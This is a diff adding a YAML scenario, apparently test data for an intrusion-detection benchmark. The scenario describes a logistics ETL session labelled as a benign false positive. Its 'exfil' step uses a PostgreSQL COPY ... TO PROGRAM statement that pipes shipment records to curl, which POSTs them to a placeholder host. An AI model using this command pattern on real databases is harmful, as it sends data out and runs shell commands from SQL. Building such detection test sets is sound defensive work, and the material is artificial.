@@ -1,0 +1,32 @@
+scenario_id: gen_logistics_73_sql_injection_ben_1991b
+family_id: gen_logistics_73_sql_injection_fam_1991
+domain: logistics
+time_of_day: '16:40'
+default_class: benign
+rule_engine_relationship: benign_false_positive
+sessions:
+- session_label: inject
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: probe
+    sql: SELECT shipment_id, status FROM shipments WHERE shipment_id = 64767
+  - step_id: exfil
+    sql: COPY (SELECT shipment_id, status FROM shipments WHERE depot_id = 'DP-11')
+      TO PROGRAM 'curl -sX POST https://deid-partner.example/ingest -d @-'
+    connects_to:
+      ip: 198.51.100.29
+      port: 9001
+matched_pair_id: gen_logistics_73_sql_injection_pair_1991
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
